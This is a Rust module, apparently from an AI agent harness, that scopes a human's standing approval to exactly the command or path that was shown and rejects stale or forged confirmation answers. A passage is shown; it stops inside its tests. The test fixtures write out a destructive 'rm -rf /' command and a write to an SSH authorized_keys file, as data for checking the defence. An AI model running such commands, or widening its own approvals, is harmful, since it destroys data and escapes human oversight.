//! What a human approval actually authorizes, and for how long.
//!
//! ## What "Always" used to mean
//!
//! Traced, not inferred from the word. The prompt (`terminal.rs:1238-1252`)
//! printed the action **type** and three bare letters — `y  n  a` — with no
//! label explaining any of them. Choosing `a` ran
//! `config.ui.auto_confirm = true` (`agent_loop.rs:873`), which
//! `needs_confirmation` reads first (`terminal.rs:1199`) and which therefore
//! returns `false` for *every* action. `config.clone()` then carried it into
//! every sub-agent (`sysaicalls.rs:1104`, `:1402`).
//!
//! So the answer is (D): **it disabled confirmation globally, for the session
//! and everything spawned from it.** The only statement of that scope was a
//! line printed *after* the choice was made. A user shown
//! `RunCommand` + `y n a` had no way to know that answering `a` also
//! pre-approved every future `MoveToTrash`.
//!
//! ## What it means now
//!
//! A grant authorizes the *operation the human was shown*, identified by the
//! action type plus the security-relevant resource it acts on — not the whole
//! payload, which carries volatile fields (file contents, timeouts) that would
//! make every grant single-use, and not the bare type, which is the breadth
//! that was never disclosed.
//!
//! Policy is never skipped. A grant answers "has the human already agreed to
//! this?", which is asked *after* policy has said approval is required:
//!
//! ```text
//! current policy  →  approval still applicable?  →  dispatch
//! ```
//!
//! never `approval exists → skip policy`. If policy tightens, the old grant
//! is simply never consulted, because the action is now denied outright.

use std::collections::HashSet;

use serde_json::Value;

/// The operator's standing decision about prompting, as a *policy* input.
///
/// Separate from `ui.confirm_writes`, which sits in the presentation section
/// yet disabled the gate outright, and which `tui_mode.rs:62` mutated from a
/// bridge setting. How prompts are rendered is a frontend preference; whether
/// prompting is required is this.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum OperatorTrust {
    /// Every gated action is put to a human. The default, and the only value a
    /// frontend may assume.
    #[default]
    Prompt,
    /// The operator has declared this session runs inside an isolation
    /// boundary they accept, and that unconfirmed writes are acceptable in it.
    ///
    /// Deliberately not derived from `bridge.mode`: "the runtime happens to be
    /// in a container" and "I accept unreviewed writes" are different claims,
    /// and only a human makes the second.
    IsolatedEnvironment,
}

/// The security-relevant identity of what an operation acts on.
///
/// Structured rather than a formatted string. A hand-built
/// `format!("{command} {args}")` collides — `{command:"git push", args:["--force"]}`
/// and `{command:"git", args:["push","--force"]}` render identically — and a
/// collision in an authority key is an authority someone did not grant.
/// `describe()` builds strings for humans; equality and hashing use these
/// fields, and the two are deliberately not the same code.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum ResourceIdentity {
    /// A process. `cwd` and `env` are part of the identity because they change
    /// what actually executes: `cargo test` in `/workspace` and in
    /// `/tmp/untrusted` run different code, and `PATH` decides which binary
    /// `cargo` even is. `timeout_secs` and `stream` are excluded — they change
    /// how long it runs, not what runs.
    Command {
        program: String,
        args: Vec<String>,
        cwd: Option<String>,
        /// Sorted, so two identical environments hash alike.
        env: Vec<(String, String)>,
    },
    /// A filesystem target, exactly as the caller wrote it.
    Path { raw: String },
    /// Several filesystem targets (PatchSet).
    Paths { raw: Vec<String> },
    /// An HTTP operation. The method is part of the authority: `GET`, `POST`
    /// and `DELETE` on one URL are three different things. For a request that
    /// carries a body, the body's digest joins the identity too, because the
    /// same endpoint with a different payload is a different effect.
    HttpCall {
        method: String,
        url: String,
        body_digest: Option<String>,
    },
    /// A read-only fetch. No method — `FetchUrl` is a GET by construction.
    Fetch { url: String },
    /// A web search. Its own variant because `WebSearch` carries `query`, not
    /// `url`: it shared `Fetch` until 2026-08-16 and therefore keyed every
    /// search in the session on `Fetch { url: "" }`, one authority for all of
    /// them.
    Search { query: String },
    /// A network host.
    Host { host: String },
    /// A live process handle. The identity of a `SendInput` is the process it
    /// feeds, never the bytes it feeds it: the bytes are a keystroke, and
    /// keying on them would ask a question per line typed into a REPL. A
    /// handle id names one process for its lifetime — once it is terminal,
    /// `SendInput` fails outright (`executor/interactive.rs`) — so a grant on
    /// it is bounded by the life of the process the human watched start.
    Handle { id: String },
    /// A remote shell target. Every component is a field: building
    /// `"{user}@{host}"` collides, since `user="u@h", host="x"` and
    /// `user="u", host="h@x"` render identically.
    SshTarget {
        user: String,
        host: String,
        port: u64,
        command: String,
        args: Vec<String>,
    },
    /// A remote instance operation. The operation *class* is the action type
    /// itself — this codebase has no generic Incus action with an operation
    /// field — so `IncusDeleteSnapshot` and `IncusRestoreSnapshot` are already
    /// separate authorities before the resource is consulted.
    Instance {
        remote: String,
        instance: String,
        detail: Vec<String>,
    },
    /// A named object in a namespace the runtime owns (snapshots, artifacts).
    Named { name: String },
    /// One asm-ai program, identified by the SHA-256 of its source.
    ///
    /// The program has no name and no path: it travels inside the action
    /// payload. Hashing it is what makes "always allow this program" mean one
    /// program — the module hash is also what the spec puts in the proof
    /// header the human reads, so the two agree by construction.
    Module { hash: String },
}

impl ResourceIdentity {
    /// Whether a grant on this identity can be safely reused later.
    ///
    /// A relative path is not an identity — it names whatever the runtime's
    /// working directory happens to be at the time, and the orchestrator does
    /// not know that directory. Reusing such a grant would let one approved
    /// resource resolve to a materially different target, which is precisely
    /// the property being defended. The orchestrator cannot reuse
    /// `ConfinedPath` (it deliberately does not link `x0ne-runtime`, they are
    /// separate processes), and building a second path resolver here would be
    /// a second path-security implementation. So the conservative rule: an
    /// ambiguous identity is asked about every time.
    pub fn is_grantable(&self) -> bool {
        match self {
            ResourceIdentity::Path { raw } => is_absolute_path(raw),
            ResourceIdentity::Paths { raw } => {
                !raw.is_empty() && raw.iter().all(|p| is_absolute_path(p))
            }
            // A command with a relative cwd has the same problem.
            ResourceIdentity::Command { cwd, .. } => {
                cwd.as_deref().map(is_absolute_path).unwrap_or(true)
            }
            // A module hash IS the program, byte for byte: an authorisation on
            // it cannot widen to another program. Explicit rather than carried
            // by the `_ => true` below: a capability-bearing identity whose
            // "grantability" comes from a catch-all is one refactor away from
            // being wrong.
            ResourceIdentity::Module { .. } => true,
            // A handle is issued by the runtime and names a live process: it
            // cannot be re-pointed, and `of` already refuses the empty handle.
            // Explicit for the same reason as `Module` — a capability-bearing
            // identity does not get its "grantability" from a catch-all.
            ResourceIdentity::Handle { .. } => true,
            _ => true,
        }
    }
}

/// Absolute, and containing no `..` component that a later resolution could
/// re-point. Lexical only — this is an identity test, not a confinement check;
/// confinement remains the runtime's job via `ConfinedPath`.
fn is_absolute_path(p: &str) -> bool {
    std::path::Path::new(p).is_absolute()
        && !std::path::Path::new(p)
            .components()
            .any(|c| matches!(c, std::path::Component::ParentDir))
}

/// The authority a grant carries.
///
/// One variant. A type-level "approve every action of this kind" grant was
/// considered and removed: nothing required it, and a latent capability to
/// widen a grant is exactly what this module exists to prevent. If such a
/// grant is ever wanted it needs its own API, its own UX wording and its own
/// tests — not a variant sitting within reach of the ordinary path.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct ApprovalScope {
    pub action_type: String,
    pub resource: ResourceIdentity,
}

impl ApprovalScope {
    /// The scope a confirmation for `action` would grant, or `None` when this
    /// action has no explicitly defined stable identity.
    ///
    /// Persistent approval is **opt-in**. There used to be a fallback that
    /// hashed the whole normalised payload, which meant any Action — including
    /// one added to `x0ne-actions` years from now by someone who never read
    /// this file — silently became session-persistently approvable, keyed on a
    /// serialization nobody had reasoned about. An action with no entry below
    /// can still be approved; it simply cannot be approved *for the session*.
    /// One-shot confirmation is the safe default, and a new Action inherits
    /// it by doing nothing.
    pub fn of(action: &Value) -> Option<Self> {
        let action_type = action
            .get("type")
            .and_then(|v| v.as_str())
            .unwrap_or("action")
            .to_string();
        let s = |k: &str| action.get(k).and_then(|v| v.as_str()).unwrap_or("");
        let opt_s = |k: &str| {
            action
                .get(k)
                .and_then(|v| v.as_str())
                .map(|v| v.to_string())
        };
        let argv = || {
            action
                .get("args")
                .and_then(|v| v.as_array())
                .map(|a| {
                    a.iter()
                        .filter_map(|v| v.as_str().map(String::from))
                        .collect::<Vec<_>>()
                })
                .unwrap_or_default()
        };
        let env = || {
            let mut e: Vec<(String, String)> = action
                .get("env")
                .and_then(|v| v.as_object())
                .map(|o| {
                    o.iter()
                        .map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string()))
                        .collect()
                })
                .unwrap_or_default();
            e.sort();
            e
        };

        let resource = match action_type.as_str() {
            "RunCommand" | "RunInSandbox" | "SafeTest" => ResourceIdentity::Command {
                program: s("command").to_string(),
                args: argv(),
                cwd: opt_s("cwd"),
                env: env(),
            },
            "SshExec" => ResourceIdentity::SshTarget {
                user: s("user").to_string(),
                host: s("host").to_string(),
                port: action.get("port").and_then(|v| v.as_u64()).unwrap_or(22),
                command: s("command").to_string(),
                args: argv(),
            },
            // Content is volatile; the path is the authority.
            "WriteFile" | "EditFile" | "ApplyPatch" | "MoveToTrash" | "ReadFile" => {
                ResourceIdentity::Path {
                    raw: s("path").to_string(),
                }
            }
            "PatchSet" => {
                let mut paths: Vec<String> = action
                    .get("patches")
                    .and_then(|v| v.as_array())
                    .map(|ps| {
                        ps.iter()
                            .filter_map(|p| {
                                p.get("path").and_then(|v| v.as_str()).map(String::from)
                            })
                            .collect()
                    })
                    .unwrap_or_default();
                paths.sort();
                ResourceIdentity::Paths { raw: paths }
            }
            "HttpRequest" => ResourceIdentity::HttpCall {
                method: action
                    .get("method")
                    .and_then(|v| v.as_str())
                    .unwrap_or("GET")
                    .to_uppercase(),
                url: s("url").to_string(),
                // A body only changes the effect of a request that has one.
                body_digest: action.get("body").and_then(|v| v.as_str()).map(digest_of),
            },
            // Read-only by construction — no method, no body.
            "FetchUrl" => ResourceIdentity::Fetch {
                url: s("url").to_string(),
            },
            // SECURITY: `query`, not `url`. `WebSearch` has no `url` field at
            // all, so sharing the arm above gave every search the identity
            // `Fetch { url: "" }` — a grant on one search covered every other.
            "WebSearch" => ResourceIdentity::Search {
                query: s("query").to_string(),
            },
            "PortCheck" | "DnsLookup" => ResourceIdentity::Host {
                host: s("host").to_string(),
            },
            "ArtifactExpose" | "ArtifactUnexpose" | "ArtifactDestroy" | "ArtifactStop" => {
                ResourceIdentity::Named {
                    name: s("id").to_string(),
                }
            }
            // `RunIncus` launches an ephemeral instance from an image and runs
            // a command in it — it has no `container` field at all, so keying
            // on one put every RunIncus under a single grant.
            "RunIncus" | "RunIncusGroup" => ResourceIdentity::Instance {
                remote: s("remote").to_string(),
                instance: s("image").to_string(),
                detail: std::iter::once(s("command").to_string())
                    .chain(argv())
                    .collect(),
            },
            "IncusCreateSnapshot"
            | "IncusRestoreSnapshot"
            | "IncusDeleteSnapshot"
            | "IncusListSnapshots" => ResourceIdentity::Instance {
                remote: s("remote").to_string(),
                instance: s("container").to_string(),
                detail: vec![s("name").to_string()],
            },
            "CreateSnapshot" | "RestoreSnapshot" | "DeleteSnapshot" => ResourceIdentity::Named {
                name: s("name").to_string(),
            },
            // SECURITY: the handle is the authority; `input` deliberately is
            // not. An empty handle is no identity — it would be one key, `""`,
            // shared by every malformed payload — so it falls through to
            // one-shot instead.
            "SendInput" => {
                let handle = s("handle").to_string();
                if handle.is_empty() {
                    return None;
                }
                ResourceIdentity::Handle { id: handle }
            }
            // The whole program is the authority: neither its name (it has
            // none), nor a path prefix (it claims none at this stage — the
            // runtime verifier will derive them). The hash is computed here
            // because the orchestrator does not link the runtime.
            //
            // SECURITY: `program_source` reads the THREE forms that
            // `deser_string_or_lines` accepts further down the stack. Reading a
            // single form would give two keys for the same program; not
            // refusing the empty one would give a single key — `hash("")` —
            // shared by every malformed payload.
            //
            // `PreviewProgram` is deliberately ABSENT from this arm. It is
            // classed ReadOnly, so `action_requires_confirmation` never gates
            // it, so nobody ever asks it for authority. Fabricating one for it
            // would be a grant nobody requested, in a set
            // (`PERSISTABLE_ACTION_TYPES`) whose whole point is to be written
            // by hand. It falls into `_ => return None`: one-shot, never
            // persistable.
            "RunProgram" => {
                let source = program_source(action);
                if source.is_empty() {
                    return None;
                }
                ResourceIdentity::Module {
                    hash: sha256_hex(&source),
                }
            }
            // No stable identity defined: one-shot only. Deliberately the
            // last arm and deliberately not a catch-all identity.
            _ => return None,
        };

        Some(ApprovalScope {
            action_type,
            resource,
        })
    }

    /// The action types that can carry a session-persistent grant.
    ///
    /// Pinned by `only_explicitly_scoped_actions_are_persistable`, so an
    /// Action added to the vocabulary cannot join this set by accident — it
    /// joins only when someone writes an arm above and updates this list.
    pub const PERSISTABLE_ACTION_TYPES: &'static [&'static str] = &[
        "RunCommand",
        "RunInSandbox",
        "SafeTest",
        "SshExec",
        "WriteFile",
        "EditFile",
        "ApplyPatch",
        "MoveToTrash",
        "ReadFile",
        "PatchSet",
        "HttpRequest",
        "FetchUrl",
        "WebSearch",
        "PortCheck",
        "DnsLookup",
        "ArtifactExpose",
        "ArtifactUnexpose",
        "ArtifactDestroy",
        "ArtifactStop",
        "RunIncus",
        "RunIncusGroup",
        "IncusCreateSnapshot",
        "IncusRestoreSnapshot",
        "IncusDeleteSnapshot",
        "IncusListSnapshots",
        "CreateSnapshot",
        "RestoreSnapshot",
        "DeleteSnapshot",
        "RunProgram",
        "SendInput",
    ];

    /// Whether this scope may be remembered at all.
    pub fn is_grantable(&self) -> bool {
        self.resource.is_grantable()
    }

    /// One line a frontend must show so the user knows what they are granting.
    ///
    /// Presentation only. Two scopes that describe identically are still
    /// different authorities if their fields differ — equality is decided by
    /// the struct, never by this string.
    pub fn describe(&self) -> String {
        let what = match &self.resource {
            ResourceIdentity::Command {
                program, args, cwd, ..
            } => {
                let line = std::iter::once(program.as_str())
                    .chain(args.iter().map(|a| a.as_str()))
                    .collect::<Vec<_>>()
                    .join(" ");
                match cwd {
                    Some(d) => format!("`{line}` in `{d}`"),
                    None => format!("`{line}`"),
                }
            }
            ResourceIdentity::Path { raw } => format!("`{raw}`"),
            ResourceIdentity::Paths { raw } => format!("`{}`", raw.join("`, `")),
            ResourceIdentity::HttpCall { method, url, .. } => format!("{method} `{url}`"),
            ResourceIdentity::Fetch { url } => format!("`{url}`"),
            ResourceIdentity::Search { query } => format!("the search `{query}`"),
            ResourceIdentity::Host { host } => format!("`{host}`"),
            ResourceIdentity::Handle { id } => format!("the running process `{id}`"),
            ResourceIdentity::SshTarget {
                user,
                host,
                port,
                command,
                args,
            } => {
                let line = std::iter::once(command.as_str())
                    .chain(args.iter().map(|a| a.as_str()))
                    .collect::<Vec<_>>()
                    .join(" ");
                format!("`{line}` on `{user}@{host}:{port}`")
            }
            ResourceIdentity::Instance {
                remote,
                instance,
                detail,
            } => {
                let d = detail.join(" ");
                if d.trim().is_empty() {
                    format!("`{remote}` / `{instance}`")
                } else {
                    format!("`{remote}` / `{instance}` running `{}`", d.trim())
                }
            }
            ResourceIdentity::Named { name } => format!("`{name}`"),
            // Twelve characters: enough to tell two programs apart by eye,
            // short enough to fit on a prompt line. The full hash stays in
            // the proof header (T9).
            //
            // `chars().take(12)` and not a byte slice: "the hash is 64 hex"
            // is held by `sha256_hex`, not by the type — `ResourceIdentity`
            // is `pub`, a caller can build a short OR non-ASCII `Module`.
            // `&hash[..12]` panicked on the first; `&hash[..12.min(hash.len())]`
            // still panicked on the second, "byte index N is not a char
            // boundary" (measured on `"aaaaaaaaaaaé bc"`). Slicing by
            // characters can do neither. Pinned by
            // `describe_never_panics_on_a_short_or_non_ascii_hash`.
            ResourceIdentity::Module { hash } => {
                format!(
                    "program `sha256:{}`",
                    hash.chars().take(12).collect::<String>()
                )
            }
        };
        // SECURITY: `what` is built from the model's own fields — a program,
        // its args, a path, a URL, a query. The one line of the approval
        // prompt that offers a STANDING permission is composed here, and it
        // was the only line the CLI printed unsanitized while its comment
        // claimed "no line of this prompt is exempt" (audit 2026-09-11,
        // 01-F5). Sanitized at the source so every frontend gets it: an ESC
        // sequence or a carriage return in an argv could repaint the prompt
        // the operator is about to answer.
        let what = crate::text_safety::sanitize(&what);
        if self.is_grantable() {
            format!(
                "Allow {} on {} for the rest of this session",
                self.action_type, what
            )
        } else {
            format!(
                "Allow {} on {} once — this target is relative, so it cannot be \
                 remembered safely",
                self.action_type, what
            )
        }
    }
}

/// Lowercase hexadecimal SHA-256. Unlike `digest_of` (FNV-1a, which
/// distinguishes payloads without authenticating them), this one carries a
/// security identity: it must be collision-resistant, because a collision
/// would be an authorisation transferred from one program to another.
///
/// SECURITY: must return exactly the same string as
/// `x0ne_runtime::scripted::hash_source` (scripted.rs:221-234) — it is the key
/// that links the authority granted by the human to the committed transaction.
/// Equality is held by `the_orchestrator_and_the_runtime_hash_a_program_identically`.
pub fn sha256_hex(input: &str) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(input.as_bytes());
    h.finalize().iter().map(|b| format!("{b:02x}")).collect()
}

/// The text of an asm-ai program, read from the action's **raw** JSON.
///
/// SECURITY: three forms, because `deser_string_or_lines`
/// (`x0ne-actions/src/lib.rs:1545-1573`) accepts three further down the
/// stack: `source` string, `source` array of lines (joined with `"\n"`, like
/// the deserialiser), and the `program` alias. `ApprovalScope::of` works before
/// any typed deserialisation: if it read only one, the same program emitted
/// in another form would get another authority key.
///
/// Returns `""` when no form is present or the content is not text. The
/// caller turns it into a `None` — never a `hash("")`, which would be a single
/// key shared by all malformed payloads.
pub fn program_source(action: &serde_json::Value) -> String {
    for key in ["source", "program"] {
        match action.get(key) {
            Some(serde_json::Value::String(s)) => return s.clone(),
            Some(serde_json::Value::Array(lines)) => {
                // A single non-text element invalidates the whole form: that
                // is what `deser_string_or_lines` does, and two different
                // readings of the same payload are exactly what we avoid.
                if lines.iter().all(|l| l.is_string()) {
                    return lines
                        .iter()
                        .map(|l| l.as_str().unwrap_or_default())
                        .collect::<Vec<_>>()
                        .join("\n");
                }
            }
            _ => {}
        }
    }
    String::new()
}

/// Short content digest, so a body participates in identity without the whole
/// payload being carried around.
fn digest_of(body: &str) -> String {
    // FNV-1a: not cryptographic, and does not need to be — this distinguishes
    // materially different payloads, it does not authenticate them.
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for b in body.as_bytes() {
        h ^= *b as u64;
        h = h.wrapping_mul(0x100_0000_01b3);
    }
    format!("{h:016x}")
}

/// Identifies one outstanding confirmation question.
///
/// Opaque and minted only by [`ApprovalAuthority::open_request`], so a
/// frontend cannot answer a question that was never asked, and a late answer
/// to a superseded question cannot be mistaken for a current one.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ConfirmationRequestId(u64);

/// A human's answer, tied to the question it answers.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ConfirmationResponse {
    pub id: ConfirmationRequestId,
    pub outcome: crate::display_sink::ConfirmOutcome,
}

/// Why a response was not honoured. Kept distinct because they mean different
/// things operationally.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ResponseRejected {
    /// No question was outstanding.
    NothingPending,
    /// The answer names a different question.
    WrongRequest,
    /// The question was still open, but the ground moved under it — a policy
    /// or config reload, a bridge change, a new session.
    Stale,
}

/// Owns session approval state.
///
/// Approval is authority. It does not live in the transcript, because a model
/// can write text; nor in the sink, because a renderer must not decide; nor in
/// an event, because events are a record of what happened. This is the owner,
/// and a grant cannot be constructed anywhere else — `ApprovalScope` is
/// public, but the set that makes one *effective* is private and only
/// `record_response` writes to it.
#[derive(Debug)]
pub struct ApprovalAuthority {
    trust: OperatorTrust,
    session: String,
    grants: HashSet<ApprovalScope>,
    /// Bumped whenever a standing grant may no longer describe reality.
    epoch: u64,
    next_id: u64,
    /// The question awaiting an answer, and the epoch it was asked in.
    outstanding: Option<(ConfirmationRequestId, u64)>,
    /// Total wall-clock spent BLOCKED on a human answering a confirmation.
    ///
    /// The turn deadline is wall-clock, so without this every second the
    /// operator spends reading a prompt and typing counts against the agent's
    /// budget. A session with nine confirmations burned its whole 180s on
    /// human thinking time and died `deadline_exceeded` having done nothing
    /// slow (field report, 2026-08-12). Accumulated here because this is the
    /// type that mediates human decisions, and it is already threaded to the
    /// driver through `AgentState`.
    human_wait: std::time::Duration,
    /// Set once a result read in this session addressed the model.
    injection: Option<String>,
    /// Plan mode (`/plan`). Written only by `CliAgentSession::set_plan_mode`,
    /// after the runtime accepted the switch.
    plan: bool,
}

impl Default for ApprovalAuthority {
    fn default() -> Self {
        Self::new(OperatorTrust::default(), "default")
    }
}

impl ApprovalAuthority {
    pub fn new(trust: OperatorTrust, session: impl Into<String>) -> Self {
        Self {
            trust,
            session: session.into(),
            grants: HashSet::new(),
            epoch: 1,
            next_id: 1,
            outstanding: None,
            human_wait: std::time::Duration::ZERO,
            injection: None,
            plan: false,
        }
    }

    /// Is the session in plan mode?
    pub fn plan_mode(&self) -> bool {
        self.plan
    }

    /// The human's `/plan` or `/build`, once the runtime holds it.
    pub(crate) fn set_plan_mode(&mut self, on: bool) {
        self.plan = on;
    }

    /// Record a suspected prompt injection. Sticky for the session: from now
    /// on egress and secret reads go to a human, yolo or not.
    pub fn mark_injection(&mut self, why: impl Into<String>) {
        if self.injection.is_none() {
            self.injection = Some(why.into());
        }
    }

    /// The first suspected injection of this session, if any.
    pub fn injection(&self) -> Option<&str> {
        self.injection.as_deref()
    }

    /// The authority a session starts with: isolated trust only in a
    /// declared and confirmed sandbox in yolo mode.
    pub fn for_mode(mode: &crate::sandbox_mode::SandboxMode, session: impl Into<String>) -> Self {
        let trust = if mode.yolo() {
            OperatorTrust::IsolatedEnvironment
        } else {
            OperatorTrust::Prompt
        };
        Self::new(trust, session)
    }

    /// Record a standing grant the operator gave by another question (the
    /// policy lift's "add to config"). Only grantable scopes are kept.
    pub(crate) fn grant(&mut self, scope: ApprovalScope) {
        if scope.is_grantable() {
            self.grants.insert(scope);
        }
    }

    pub fn trust(&self) -> OperatorTrust {
        self.trust
    }

    pub fn session(&self) -> &str {
        &self.session
    }

    pub fn grant_count(&self) -> usize {
        self.grants.len()
    }

    /// Whether a standing grant already covers this scope.
    ///
    /// Consulted only after policy has said approval is required, never
    /// instead of policy.
    /// Time the human spent deciding, to be excluded from the turn deadline.
    pub fn human_wait(&self) -> std::time::Duration {
        self.human_wait
    }

    /// Record time spent blocked on a human.
    pub fn add_human_wait(&mut self, d: std::time::Duration) {
        self.human_wait += d;
    }

    pub fn covers(&self, scope: &ApprovalScope) -> bool {
        // Plan mode suspends every standing grant and yolo with it; they come
        // back with `/build`, unchanged.
        if self.plan {
            return false;
        }
        if self.trust == OperatorTrust::IsolatedEnvironment {
            return true;
        }
        // Exact structural match only. There is no widening rule, because
        // there is no broader scope to widen to.
        self.grants.contains(scope)
    }

    /// Open a question. Supersedes any previous outstanding one, so a late
    /// answer to the old question is rejected rather than applied to the new.
    pub fn open_request(&mut self) -> ConfirmationRequestId {
        let id = ConfirmationRequestId(self.next_id);
        self.next_id += 1;
        self.outstanding = Some((id, self.epoch));
        id
    }

    /// Validate an answer against the outstanding question and, if it is a
    /// standing approval, record the grant.
    ///
    /// Returns the outcome only when the answer is legitimate. Every rejection
    /// path leaves no grant behind.
    /// `scope` is `None` when the action has no stable identity. Such an
    /// approval is honoured for this one dispatch and never remembered.
    pub fn record_response(
        &mut self,
        response: ConfirmationResponse,
        scope: Option<&ApprovalScope>,
    ) -> Result<crate::display_sink::ConfirmOutcome, ResponseRejected> {
        let Some((pending_id, asked_epoch)) = self.outstanding else {
            return Err(ResponseRejected::NothingPending);
        };
        if response.id != pending_id {
            return Err(ResponseRejected::WrongRequest);
        }
        if asked_epoch != self.epoch {
            // The question was asked under a policy or runtime that has since
            // been replaced. Answering it now would authorize something the
            // human was never shown.
            self.outstanding = None;
            return Err(ResponseRejected::Stale);
        }
        // Consume it: a duplicate answer finds nothing pending.
        self.outstanding = None;

        if response.outcome == crate::display_sink::ConfirmOutcome::Always {
            // Remembered only when the action has a stable identity *and* that
            // identity cannot be re-pointed later. Otherwise the approval
            // degrades to a one-off rather than becoming a grant that could
            // resolve somewhere else.
            match scope.filter(|s| s.is_grantable()) {
                Some(s) => {
                    self.grants.insert(s.clone());
                }
                None => tracing::info!("approval not retained: no stable identity for this action"),
            }
        }
        Ok(response.outcome)
    }

    /// Abandon the outstanding question without granting anything.
    ///
    /// Used on cancellation. Deliberately does **not** touch existing grants:
    /// cancelling one action is a statement about that action, not a
    /// withdrawal of a decision the human made about others.
    pub fn abandon_request(&mut self) {
        self.outstanding = None;
    }

    /// Drop every standing grant and invalidate any outstanding question.
    ///
    /// Called when the ground a grant stood on may have moved: a policy or
    /// config reload, a bridge/runtime identity change, a new session. A grant
    /// describes a decision about a particular operation under a particular
    /// policy against a particular runtime; when any of those is replaced the
    /// decision no longer refers to anything.
    pub fn revoke_all(&mut self, reason: &str) {
        if !self.grants.is_empty() {
            tracing::info!(
                reason,
                count = self.grants.len(),
                "revoking standing approvals"
            );
        }
        self.grants.clear();
        self.epoch += 1;
        self.outstanding = None;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::display_sink::ConfirmOutcome;
    use serde_json::json;

    fn cargo_test() -> Value {
        json!({"type": "RunCommand", "command": "cargo", "args": ["test"]})
    }

    fn rm_rf_root() -> Value {
        json!({"type": "RunCommand", "command": "rm", "args": ["-rf", "/"]})
    }

    /// Unwrapping helper: these fixtures are all explicitly scoped actions.
    fn scope_of(action: &Value) -> ApprovalScope {
        ApprovalScope::of(action).expect("fixture is an explicitly scoped action")
    }

    fn approve_always(auth: &mut ApprovalAuthority, action: &Value) {
        let scope = ApprovalScope::of(action);
        let id = auth.open_request();
        auth.record_response(
            ConfirmationResponse {
                id,
                outcome: ConfirmOutcome::Always,
            },
            scope.as_ref(),
        )
        .expect("legitimate answer");
    }

    // ── Scope ─────────────────────────────────────────────────────────────

    /// ADVERSARIAL 1: approving `cargo test` must not approve `rm -rf /`.
    /// Scoping on the program alone would; scoping on the bare action type —
    /// which is what the previous iteration did — certainly would.
    #[test]
    fn approving_one_command_does_not_approve_a_different_one() {
        let mut auth = ApprovalAuthority::default();
        approve_always(&mut auth, &cargo_test());
        assert!(auth.covers(&scope_of(&cargo_test())));
        assert!(
            !auth.covers(&scope_of(&rm_rf_root())),
            "a different command is a different authority"
        );
        assert!(
            !auth.covers(&scope_of(
                &json!({"type": "RunCommand", "command": "cargo", "args": ["publish"]})
            )),
            "different arguments to the same program are a different authority"
        );
    }

    /// ADVERSARIAL 2: approving a write under the workspace must not authorize
    /// an unrelated sensitive path.
    #[test]
    fn approving_one_path_does_not_approve_another() {
        let mut auth = ApprovalAuthority::default();
        approve_always(
            &mut auth,
            &json!({"type": "WriteFile", "path": "/workspace/a.rs", "content": "x"}),
        );
        assert!(
            auth.covers(&scope_of(
                &json!({"type": "WriteFile", "path": "/workspace/a.rs", "content": "DIFFERENT"})
            )),
            "content is volatile — the same file is the same authority"
        );
        assert!(
            !auth.covers(&scope_of(
                &json!({"type": "WriteFile", "path": "/home/u/.ssh/authorized_keys", "content": "x"})
            )),
            "a different path is a different authority"
        );
    }

    /// Volatile fields must not fragment a grant into uselessness.
    #[test]
    fn volatile_fields_do_not_change_the_scope() {
        let a = json!({"type": "WriteFile", "path": "/w/a", "content": "one"});
        let b = json!({"type": "WriteFile", "path": "/w/a", "content": "two"});
        assert_eq!(scope_of(&a), scope_of(&b));
    }

    #[test]
    fn ssh_scope_covers_destination_and_command() {
        let a = json!({"type":"SshExec","host":"h1","user":"u","command":"ls","args":[]});
        let b = json!({"type":"SshExec","host":"h2","user":"u","command":"ls","args":[]});
        assert_ne!(
            scope_of(&a),
            scope_of(&b),
            "a different host is a different authority"
        );
    }

    /// The snapshot actions do carry `container`, and two instances are two
    /// authorities.
    #[test]
    fn incus_scope_covers_remote_and_instance() {
        let a = json!({"type":"IncusRestoreSnapshot","remote":"local","container":"c1","name":"s"});
        let b = json!({"type":"IncusRestoreSnapshot","remote":"local","container":"c2","name":"s"});
        assert_ne!(scope_of(&a), scope_of(&b));
    }

    // ── Correlation ───────────────────────────────────────────────────────

    /// ADVERSARIAL 6: an answer naming a different question grants nothing.
    #[test]
    fn a_wrong_request_id_is_rejected() {
        let mut auth = ApprovalAuthority::default();
        let scope = scope_of(&cargo_test());
        let _real = auth.open_request();
        let forged = ConfirmationRequestId(9999);
        assert_eq!(
            auth.record_response(
                ConfirmationResponse {
                    id: forged,
                    outcome: ConfirmOutcome::Always
                },
                Some(&scope)
            ),
            Err(ResponseRejected::WrongRequest)
        );
        assert_eq!(auth.grant_count(), 0);
    }

    /// ADVERSARIAL 5: a sink cannot answer a question that was never asked.
    #[test]
    fn a_response_with_nothing_pending_is_rejected() {
        let mut auth = ApprovalAuthority::default();
        let scope = scope_of(&cargo_test());
        assert_eq!(
            auth.record_response(
                ConfirmationResponse {
                    id: ConfirmationRequestId(1),
                    outcome: ConfirmOutcome::Always
                },
                Some(&scope)
            ),
            Err(ResponseRejected::NothingPending)
        );
        assert_eq!(auth.grant_count(), 0);
    }

    /// A duplicate answer finds nothing pending — the first consumed it.
    #[test]
    fn a_duplicate_response_is_rejected() {
        let mut auth = ApprovalAuthority::default();
        let scope = scope_of(&cargo_test());
        let id = auth.open_request();
        let resp = ConfirmationResponse {
            id,
            outcome: ConfirmOutcome::Yes,
        };
        assert!(auth.record_response(resp, Some(&scope)).is_ok());
        assert_eq!(
            auth.record_response(resp, Some(&scope)),
            Err(ResponseRejected::NothingPending)
        );
    }

    /// ADVERSARIAL 7: an answer to a question asked under a policy that has
    /// since been reloaded authorizes nothing — the human was shown a
    /// different world.
    #[test]
    fn a_response_after_a_policy_reload_is_stale() {
        let mut auth = ApprovalAuthority::default();
        let scope = scope_of(&cargo_test());
        let id = auth.open_request();
        auth.revoke_all("config reloaded");
        assert_eq!(
            auth.record_response(
                ConfirmationResponse {
                    id,
                    outcome: ConfirmOutcome::Always
                },
                Some(&scope)
            ),
            Err(ResponseRejected::NothingPending),
            "revocation clears the outstanding question too"
        );
        assert_eq!(auth.grant_count(), 0);
    }

    /// A superseded question cannot be answered once a newer one is open.
    #[test]
